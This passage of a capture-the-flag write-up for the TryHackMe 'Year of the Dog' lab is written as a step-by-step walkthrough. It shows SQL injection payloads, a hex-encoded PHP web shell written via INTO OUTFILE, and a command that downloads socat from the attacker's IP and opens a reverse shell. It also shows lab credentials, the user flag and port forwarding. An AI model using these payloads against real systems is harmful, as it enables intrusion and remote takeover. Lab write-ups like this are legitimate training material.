+</span></span><span class=line><span class=cl>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class=line><span class=cl>Nmap done: 1 IP address (1 host up) scanned in 24.49 seconds
+</span></span></code></pre></td></tr></table></div></div><p><a href=http://10.10.179.85/></a></p><p><img loading=lazy src=/writeups/tryhackme/year-of-the-dog/2020-11-14_19-22.png alt></p><p><code>644bbad7b32f0a63ef4dc1de84e153ca'</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;644bbad7b32f0a63ef4dc1de84e153ca&#39;&#39;&#39; at line 1
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&#39; union select 1, @@version-- -
+</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=/writeups/tryhackme/year-of-the-dog/2020-11-14_19-24.png alt></p><p><code>You are number 5.7.31-0ubuntu0.18.04.1 in the queue</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&#39; union select 1, table_name FROM information_schema.tables-- -
+</span></span></code></pre></td></tr></table></div></div><p><code>You are number queue in the queue</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=s1>&#39; INTO OUTFILE &#39;</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>html</span><span class=o>/</span><span class=n>shell</span><span class=o>.</span><span class=n>php</span><span class=s1>&#39; LINES TERMINATED BY 0x3C3F706870206563686F20223C7072653E22202E207368656C6C5F6578656328245F4745545B22636D64225D29202E20223C2F7072653E223B3F3E-- -</span>
+</span></span></code></pre></td></tr></table></div></div><p><a href="http://10.10.179.85/shell.php?cmd=whoami">http://10.10.179.85/shell.php?cmd=whoami</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>wget 10.8.106.222/socat -q -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat tcp:10.8.106.222:53 exec:&#34;bash -li&#34;,pty,stderr,sigint,setsid,sane
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>wget%2010.8.106.222%2Fsocat%20-q%20-O%20%2Ftmp%2Fsocat%3B%20chmod%20%2Bx%20%2Ftmp%2Fsocat%3B%20%2Ftmp%2Fsocat%20tcp%3A10.8.106.222%3A53%20exec%3A%22bash%20-li%22%2Cpty%2Cstderr%2Csigint%2Csetsid%2Csane
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-mysql data-lang=mysql><span class=line><span class=cl><span class=n>kali</span><span class=o>@</span><span class=n>kali</span><span class=p>:</span><span class=o>~/</span><span class=n>CTFs</span><span class=o>/</span><span class=n>tryhackme</span><span class=o>/</span><span class=kt>Year</span><span class=w> </span><span class=n>of</span><span class=w> </span><span class=n>the</span><span class=w> </span><span class=n>Dog</span><span class=err>$</span><span class=w> </span><span class=n>sudo</span><span class=w> </span><span class=n>socat</span><span class=w> </span><span class=n>tcp</span><span class=o>-</span><span class=n>l</span><span class=p>:</span><span class=mi>53</span><span class=w> </span><span class=n>file</span><span class=p>:</span><span class=o>`</span><span class=n>tty</span><span class=o>`</span><span class=p>,</span><span class=n>raw</span><span class=p>,</span><span class=n>echo</span><span class=o>=</span><span class=mi>0</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=p>[</span><span class=n>sudo</span><span class=p>]</span><span class=w> </span><span class=n>password</span><span class=w> </span><span class=k>for</span><span class=w> </span><span class=n>kali</span><span class=p>:</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=o>@</span><span class=kt>year</span><span class=o>-</span><span class=n>of</span><span class=o>-</span><span class=n>the</span><span class=o>-</span><span class=n>dog</span><span class=p>:</span><span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>dylan</span><span class=err>$</span><span class=w> </span><span class=n>ls</span><span class=w> </span><span class=o>-</span><span class=n>la</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=n>total</span><span class=w> </span><span class=mi>120</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=n>drwxr</span><span class=o>-</span><span class=n>xr</span><span class=o>-</span><span class=n>x</span><span class=w> </span><span class=mi>4</span><span class=w> </span><span class=n>dylan</span><span class=w> </span><span class=n>dylan</span><span class=w>  </span><span class=mi>4096</span><span class=w> </span><span class=n>Sep</span><span class=w>  </span><span class=mi>5</span><span class=w> </span><span class=mi>22</span><span class=p>:</span><span class=mi>36</span><span class=w> </span><span class=p>.</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=n>drwxr</span><span class=o>-</span><span class=n>xr</span><span class=o>-</span><span class=n>x</span><span class=w> </span><span class=mi>3</span><span class=w> </span><span class=n>root</span><span class=w>  </span><span class=n>root</span><span class=w>   </span><span class=mi>4096</span><span class=w> </span><span class=n>Sep</span><span class=w>  </span><span class=mi>3</span><span class=w> </span><span class=mi>17</span><span class=p>:</span><span class=mi>23</span><span class=w> </span><span class=p>..</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=n>lrwxrwxrwx</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=n>dylan</span><span class=w> </span><span class=n>dylan</span><span class=w>     </span><span class=mi>9</span><span class=w> </span><span class=n>Sep</span><span class=w>  </span><span class=mi>3</span><span class=w> </span><span class=mi>17</span><span class=p>:</span><span class=mi>24</span><span class=w> </span><span class=p>.</span><span class=n>bash_history</span><span class=w> </span><span class=o>-&gt;</span><span class=w> </span><span class=o>/</span><span class=n>dev</span><span class=o>/</span><span class=no>null</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=o>-</span><span class=n>rw</span><span class=o>-</span><span class=n>r</span><span class=o>--</span><span class=n>r</span><span class=c1>-- 1 dylan dylan   220 Sep  3 17:23 .bash_logout
+</span></span></span><span class=line><span class=cl><span class=o>-</span><span class=n>rw</span><span class=o>-</span><span class=n>r</span><span class=o>--</span><span class=n>r</span><span class=c1>-- 1 dylan dylan  3771 Sep  3 17:23 .bashrc
+</span></span></span><span class=line><span class=cl><span class=n>drwx</span><span class=o>----</span><span class=c1>-- 2 dylan dylan  4096 Sep  3 17:24 .cache
+</span></span></span><span class=line><span class=cl><span class=o>-</span><span class=n>rw</span><span class=o>-</span><span class=n>rw</span><span class=o>-</span><span class=n>r</span><span class=c1>-- 1 dylan dylan    53 Sep  5 21:40 .gitconfig
+</span></span></span><span class=line><span class=cl><span class=n>drwx</span><span class=o>----</span><span class=c1>-- 3 dylan dylan  4096 Sep  3 17:24 .gnupg
+</span></span></span><span class=line><span class=cl><span class=n>lrwxrwxrwx</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=n>root</span><span class=w>  </span><span class=n>root</span><span class=w>      </span><span class=mi>9</span><span class=w> </span><span class=n>Sep</span><span class=w>  </span><span class=mi>3</span><span class=w> </span><span class=mi>21</span><span class=p>:</span><span class=mi>16</span><span class=w> </span><span class=p>.</span><span class=n>mysql_history</span><span class=w> </span><span class=o>-&gt;</span><span class=w> </span><span class=o>/</span><span class=n>dev</span><span class=o>/</span><span class=no>null</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=o>-</span><span class=n>rw</span><span class=o>-</span><span class=n>r</span><span class=o>--</span><span class=n>r</span><span class=c1>-- 1 dylan dylan   807 Sep  3 17:23 .profile
+</span></span></span><span class=line><span class=cl><span class=o>-</span><span class=n>rw</span><span class=o>-</span><span class=n>r</span><span class=o>--</span><span class=n>r</span><span class=c1>-- 1 dylan dylan     0 Sep  3 17:25 .sudo_as_admin_successful
+</span></span></span><span class=line><span class=cl><span class=o>-</span><span class=n>r</span><span class=o>------</span><span class=c1>-- 1 dylan dylan    38 Sep  5 22:36 user.txt
+</span></span></span><span class=line><span class=cl><span class=o>-</span><span class=n>rw</span><span class=o>-</span><span class=n>r</span><span class=o>--</span><span class=n>r</span><span class=c1>-- 1 dylan dylan 85134 Sep  5 21:11 work_analysis
+</span></span></span><span class=line><span class=cl><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=o>@</span><span class=kt>year</span><span class=o>-</span><span class=n>of</span><span class=o>-</span><span class=n>the</span><span class=o>-</span><span class=n>dog</span><span class=p>:</span><span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>dylan</span><span class=err>$</span><span class=w> </span><span class=n>cat</span><span class=w> </span><span class=k>user</span><span class=p>.</span><span class=n>txt</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=n>cat</span><span class=p>:</span><span class=w> </span><span class=k>user</span><span class=p>.</span><span class=n>txt</span><span class=p>:</span><span class=w> </span><span class=n>Permission</span><span class=w> </span><span class=n>denied</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=o>@</span><span class=kt>year</span><span class=o>-</span><span class=n>of</span><span class=o>-</span><span class=n>the</span><span class=o>-</span><span class=n>dog</span><span class=p>:</span><span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>dylan</span><span class=err>$</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>www-data@year-of-the-dog:/home/dylan$ head work_analysis
+</span></span><span class=line><span class=cl>Sep  5 20:52:34 staging-server sshd[39184]: Received disconnect from 192.168.1.142 port 45582:11: Bye Bye [preauth]
+</span></span><span class=line><span class=cl>Sep  5 20:52:34 staging-server sshd[39184]: Disconnected from authenticating user root 192.168.1.142 port 45582 [preauth]
+</span></span><span class=line><span class=cl>Sep  5 20:52:35 staging-server sshd[39190]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.1.142  user=root
+</span></span><span class=line><span class=cl>Sep  5 20:52:35 staging-server sshd[39191]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.1.142  user=root
+</span></span><span class=line><span class=cl>Sep  5 20:52:35 staging-server sshd[39194]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.1.142  user=root
+</span></span><span class=line><span class=cl>Sep  5 20:52:35 staging-server sshd[39195]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.1.142  user=root
+</span></span><span class=line><span class=cl>Sep  5 20:52:35 staging-server sshd[39192]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.1.142  user=root
+</span></span><span class=line><span class=cl>Sep  5 20:52:35 staging-server sshd[39189]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.1.142  user=root
+</span></span><span class=line><span class=cl>Sep  5 20:52:35 staging-server sshd[39186]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.1.142  user=root
+</span></span><span class=line><span class=cl>Sep  5 20:52:35 staging-server sshd[39196]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.1.142  user=root
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>www-data@year-of-the-dog:/home/dylan$ grep &#34;dylan&#34; work_analysis
+</span></span><span class=line><span class=cl>Sep  5 20:52:57 staging-server sshd[39218]: Invalid user dylanLabr4d0rs4L1f3 from 192.168.1.142 port 45624
+</span></span><span class=line><span class=cl>Sep  5 20:53:03 staging-server sshd[39218]: Failed password for invalid user dylanLabr4d0rs4L1f3 from 192.168.1.142 port 45624 ssh2
+</span></span><span class=line><span class=cl>Sep  5 20:53:04 staging-server sshd[39218]: Connection closed by invalid user dylanLabr4d0rs4L1f3 192.168.1.142 port 45624 [preauth]
+</span></span><span class=line><span class=cl>www-data@year-of-the-dog:/home/dylan$
+</span></span></code></pre></td></tr></table></div></div><p><code>dylan:Labr4d0rs4L1f3</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Year of the Dog$ ssh dylan@10.10.179.85
+</span></span><span class=line><span class=cl>The authenticity of host &#39;10.10.179.85 (10.10.179.85)&#39; can&#39;t be established.
+</span></span><span class=line><span class=cl>ECDSA key fingerprint is SHA256:ZQhtZbHSQm8e0SOq4EyzzwfLf01L5P0MC3bdo9xqb0M.
+</span></span><span class=line><span class=cl>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span><span class=line><span class=cl>Warning: Permanently added &#39;10.10.179.85&#39; (ECDSA) to the list of known hosts.
+</span></span><span class=line><span class=cl>dylan@10.10.179.85&#39;s password:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        __   __                       __   _   _            ____
+</span></span><span class=line><span class=cl>        \ \ / /__  __ _ _ __    ___  / _| | |_| |__   ___  |  _ \  ___   __ _
+</span></span><span class=line><span class=cl>         \ V / _ \/ _` | &#39;__|  / _ \| |_  | __| &#39;_ \ / _ \ | | | |/ _ \ / _` |
+</span></span><span class=line><span class=cl>          | |  __/ (_| | |    | (_) |  _| | |_| | | |  __/ | |_| | (_) | (_| |
+</span></span><span class=line><span class=cl>          |_|\___|\__,_|_|     \___/|_|    \__|_| |_|\___| |____/ \___/ \__, |
+</span></span><span class=line><span class=cl>                                                                        |___/
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>dylan@year-of-the-dog:~$
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>dylan@year-of-the-dog:~$ cat user.txt
+</span></span><span class=line><span class=cl>THM{OTE3MTQyNTM5NzRiN2VjNTQyYWM2M2Ji}
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>dylan@year-of-the-dog:~$ ss -tulwn
+</span></span><span class=line><span class=cl>Netid   State     Recv-Q    Send-Q            Local Address:Port          Peer Address:Port
+</span></span><span class=line><span class=cl>icmp6   UNCONN    0         0                        *%eth0:58                       *:*
+</span></span><span class=line><span class=cl>udp     UNCONN    0         0                       0.0.0.0:41742              0.0.0.0:*
+</span></span><span class=line><span class=cl>udp     UNCONN    0         0                 127.0.0.53%lo:53                 0.0.0.0:*
+</span></span><span class=line><span class=cl>udp     UNCONN    0         0             10.10.179.85%eth0:68                 0.0.0.0:*
+</span></span><span class=line><span class=cl>tcp     LISTEN    0         128               127.0.0.53%lo:53                 0.0.0.0:*
+</span></span><span class=line><span class=cl>tcp     LISTEN    0         128                     0.0.0.0:22                 0.0.0.0:*
+</span></span><span class=line><span class=cl>tcp     LISTEN    0         128                   127.0.0.1:3000               0.0.0.0:*
+</span></span><span class=line><span class=cl>tcp     LISTEN    0         128                   127.0.0.1:36097              0.0.0.0:*
+</span></span><span class=line><span class=cl>tcp     LISTEN    0         80                    127.0.0.1:3306               0.0.0.0:*
+</span></span><span class=line><span class=cl>tcp     LISTEN    0         128                           *:80                       *:*
+</span></span><span class=line><span class=cl>tcp     LISTEN    0         128                        [::]:22                    [::]:*
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>www-data@year-of-the-dog:/home/dylan$ /tmp/socat tcp-l:8080,fork,reuseaddr tcp:127.0.0.1:3000 &amp;
+</span></span><span class=line><span class=cl>[1] 1590
+</span></span><span class=line><span class=cl>www-data@year-of-the-dog:/home/dylan$
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>dylan</span><span class=err>@</span><span class=n>year</span><span class=o>-</span><span class=n>of</span><span class=o>-</span><span class=n>the</span><span class=o>-</span><span class=n>dog</span><span class=p>:</span><span class=o>~$</span> <span class=n>ls</span> <span class=o>-</span><span class=n>la</span> <span class=o>/</span>
+</span></span><span class=line><span class=cl><span class=n>total</span> <span class=mi>239796</span>
+</span></span><span class=line><span class=cl><span class=n>drwxr</span><span class=o>-</span><span class=n>xr</span><span class=o>-</span><span class=n>x</span>  <span class=mi>23</span> <span class=n>root</span> <span class=n>root</span>      <span class=mi>4096</span> <span class=n>Sep</span>  <span class=mi>5</span> <span class=mi>19</span><span class=p>:</span><span class=mi>29</span> <span class=o>.</span>
+</span></span><span class=line><span class=cl><span class=n>drwxr</span><span class=o>-</span><span class=n>xr</span><span class=o>-</span><span class=n>x</span>  <span class=mi>23</span> <span class=n>root</span> <span class=n>root</span>      <span class=mi>4096</span> <span class=n>Sep</span>  <span class=mi>5</span> <span class=mi>19</span><span class=p>:</span><span class=mi>29</span> <span class=o>..</span>
+</span></span><span class=line><span class=cl><span class=n>drwxr</span><span class=o>-</span><span class=n>xr</span><span class=o>-</span><span class=n>x</span>   <span class=mi>2</span> <span class=n>root</span> <span class=n>root</span>      <span class=mi>4096</span> <span class=n>Sep</span>  <span class=mi>3</span> <span class=mi>17</span><span class=p>:</span><span class=mi>31</span> <span class=n>bin</span>
+</span></span><span class=line><span class=cl><span class=n>drwxr</span><span class=o>-</span><span class=n>xr</span><span class=o>-</span><span class=n>x</span>   <span class=mi>3</span> <span class=n>root</span> <span class=n>root</span>      <span class=mi>4096</span> <span class=n>Sep</span>  <span class=mi>3</span> <span class=mi>17</span><span class=p>:</span><span class=mi>34</span> <span class=n>boot</span>
+</span></span><span class=line><span class=cl><span class=n>drwxr</span><span class=o>-</span><span class=n>xr</span><span class=o>-</span><span class=n>x</span>  <span class=mi>17</span> <span class=n>root</span> <span class=n>root</span>      <span class=mi>3680</span> <span class=n>Nov</span> <span class=mi>14</span> <span class=mi>18</span><span class=p>:</span><span class=mi>10</span> <span class=n>dev</span>
+</span></span><span class=line><span class=cl><span class=n>drwxr</span><span class=o>-</span><span class=n>xr</span><span class=o>-</span><span class=n>x</span>  <span class=mi>93</span> <span class=n>root</span> <span class=n>root</span>      <span class=mi>4096</span> <span class=n>Sep</span>  <span class=mi>6</span> <span class=mi>23</span><span class=p>:</span><span class=mi>31</span> <span class=n>etc</span>
+</span></span><span class=line><span class=cl><span class=n>drwxr</span><span class=o>-</span><span class=n>xr</span><span class=o>-</span><span class=n>x</span>   <span class=mi>5</span> <span class=n>root</span> <span class=n>root</span>      <span class=mi>4096</span> <span class=n>Sep</span>  <span class=mi>5</span> <span class=mi>19</span><span class=p>:</span><span class=mi>29</span> <span class=n>gitea</span>
+</span></span><span class=line><span class=cl><span class=n>drwxr</span><span class=o>-</span><span class=n>xr</span><span class=o>-</span><span class=n>x</span>   <span class=mi>3</span> <span class=n>root</span> <span class=n>root</span>      <span class=mi>4096</span> <span class=n>Sep</span>  <span class=mi>3</span> <span class=mi>17</span><span class=p>:</span><span class=mi>23</span> <span class=n>home</span>
+</span></span><span class=line><span class=cl><span class=n>lrwxrwxrwx</span>   <span class=mi>1</span> <span class=n>root</span> <span class=n>root</span>        <span class=mi>34</span> <span class=n>Sep</span>  <span class=mi>3</span> <span class=mi>17</span><span class=p>:</span><span class=mi>33</span> <span class=n>initrd</span><span class=o>.</span><span class=n>img</span> <span class=o>-&gt;</span> <span class=n>boot</span><span class=o>/</span><span class=n>initrd</span><span class=o>.</span><span class=n>img</span><span class=o>-</span><span class=mf>4.15</span><span class=o>.</span><span class=mi>0</span><span class=o>-</span><span class=mi>115</span><span class=o>-</span><span class=n>generic</span>
+</span></span><span class=line><span class=cl><span class=n>lrwxrwxrwx</span>   <span class=mi>1</span> <span class=n>root</span> <span class=n>root</span>        <span class=mi>33</span> <span class=n>Sep</span>  <span class=mi>3</span> <span class=mi>17</span><span class=p>:</span><span class=mi>17</span> <span class=n>initrd</span><span class=o>.</span><span class=n>img</span><span class=o>.</span><span class=n>old</span> <span class=o>-&gt;</span> <span class=n>boot</span><span class=o>/</span><span class=n>initrd</span><span class=o>.</span><span class=n>img</span><span class=o>-</span><span class=mf>4.15</span><span class=o>.</span><span class=mi>0</span><span class=o>-</span><span class=mi>20</span><span class=o>-</span><span class=n>generic</span>
+</span></span><span class=line><span class=cl><span class=n>drwxr</span><span class=o>-</span><span class=n>xr</span><span class=o>-</span><span class=n>x</span>  <span class=mi>23</span> <span class=n>root</span> <span class=n>root</span>      <span class=mi>4096</span> <span class=n>Sep</span>  <span class=mi>5</span> <span class=mi>13</span><span class=p>:</span><span class=mi>21</span> <span class=n>lib</span>
+</span></span><span class=line><span class=cl><span class=n>drwxr</span><span class=o>-</span><span class=n>xr</span><span class=o>-</span><span class=n>x</span>   <span class=mi>2</span> <span class=n>root</span> <span class=n>root</span>      <span class=mi>4096</span> <span class=n>Sep</span>  <span class=mi>3</span> <span class=mi>17</span><span class=p>:</span><span class=mi>30</span> <span class=n>lib64</span>
+</span></span><span class=line><span class=cl><span class=n>drwx</span><span class=o>------</span>   <span class=mi>2</span> <span class=n>root</span> <span class=n>root</span>     <span class=mi>16384</span> <span class=n>Sep</span>  <span class=mi>3</span> <span class=mi>17</span><span class=p>:</span><span class=mi>17</span> <span class=n>lost</span><span class=o>+</span><span class=n>found</span>
+</span></span><span class=line><span class=cl><span class=n>drwxr</span><span class=o>-</span><span class=n>xr</span><span class=o>-</span><span class=n>x</span>   <span class=mi>3</span> <span class=n>root</span> <span class=n>root</span>      <span class=mi>4096</span> <span class=n>Sep</span>  <span class=mi>3</span> <span class=mi>17</span><span class=p>:</span><span class=mi>17</span> <span class=n>media</span>
+</span></span><span class=line><span class=cl><span class=n>drwxr</span><span class=o>-</span><span class=n>xr</span><span class=o>-</span><span class=n>x</span>   <span class=mi>2</span> <span class=n>root</span> <span class=n>root</span>      <span class=mi>4096</span> <span class=n>Apr</span> <span class=mi>26</span>  <span class=mi>2018</span> <span class=n>mnt</span>
+</span></span><span class=line><span class=cl><span class=n>drwxr</span><span class=o>-</span><span class=n>xr</span><span class=o>-</span><span class=n>x</span>   <span class=mi>3</span> <span class=n>root</span> <span class=n>root</span>      <span class=mi>4096</span> <span class=n>Sep</span>  <span class=mi>5</span> <span class=mi>13</span><span class=p>:</span><span class=mi>21</span> <span class=n>opt</span>
+</span></span><span class=line><span class=cl><span class=n>dr</span><span class=o>-</span><span class=n>xr</span><span class=o>-</span><span class=n>xr</span><span class=o>-</span><span class=n>x</span> <span class=mi>121</span> <span class=n>root</span> <span class=n>root</span>         <span class=mi>0</span> <span class=n>Nov</span> <span class=mi>14</span> <span class=mi>18</span><span class=p>:</span><span class=mi>10</span> <span class=n>proc</span>
+</span></span><span class=line><span class=cl><span class=n>drwx</span><span class=o>------</span>   <span class=mi>4</span> <span class=n>root</span> <span class=n>root</span>      <span class=mi>4096</span> <span class=n>Sep</span>  <span class=mi>6</span> <span class=mi>14</span><span class=p>:</span><span class=mi>07</span> <span class=n>root</span>
+</span></span><span class=line><span class=cl><span class=n>drwxr</span><span class=o>-</span><span class=n>xr</span><span class=o>-</span><span class=n>x</span>  <span class=mi>28</span> <span class=n>root</span> <span class=n>root</span>       <span class=mi>900</span> <span class=n>Nov</span> <span class=mi>14</span> <span class=mi>18</span><span class=p>:</span><span class=mi>10</span> <span class=n>run</span>
+</span></span><span class=line><span class=cl><span class=n>drwxr</span><span class=o>-</span><span class=n>xr</span><span class=o>-</span><span class=n>x</span>   <span class=mi>2</span> <span class=n>root</span> <span class=n>root</span>     <span class=mi>12288</span> <span class=n>Sep</span>  <span class=mi>5</span> <span class=mi>13</span><span class=p>:</span><span class=mi>21</span> <span class=n>sbin</span>
+</span></span><span class=line><span class=cl><span class=n>drwxr</span><span class=o>-</span><span class=n>xr</span><span class=o>-</span><span class=n>x</span>   <span class=mi>2</span> <span class=n>root</span> <span class=n>root</span>      <span class=mi>4096</span> <span class=n>Apr</span> <span class=mi>26</span>  <span class=mi>2018</span> <span class=n>srv</span>
+</span></span><span class=line><span class=cl><span class=o>-</span><span class=n>rw</span><span class=o>-------</span>   <span class=mi>1</span> <span class=n>root</span> <span class=n>root</span> <span class=mi>245452800</span> <span class=n>Sep</span>  <span class=mi>3</span> <span class=mi>17</span><span class=p>:</span><span class=mi>17</span> <span class=n>swapfile</span>
+</span></span><span class=line><span class=cl><span class=n>dr</span><span class=o>-</span><span class=n>xr</span><span class=o>-</span><span class=n>xr</span><span class=o>-</span><span class=n>x</span>  <span class=mi>13</span> <span class=n>root</span> <span class=n>root</span>         <span class=mi>0</span> <span class=n>Nov</span> <span class=mi>14</span> <span class=mi>18</span><span class=p>:</span><span class=mi>10</span> <span class=n>sys</span>
+</span></span><span class=line><span class=cl><span class=n>drwxrwxrwt</span>  <span class=mi>10</span> <span class=n>root</span> <span class=n>root</span>      <span class=mi>4096</span> <span class=n>Nov</span> <span class=mi>14</span> <span class=mi>18</span><span class=p>:</span><span class=mi>48</span> <span class=n>tmp</span>
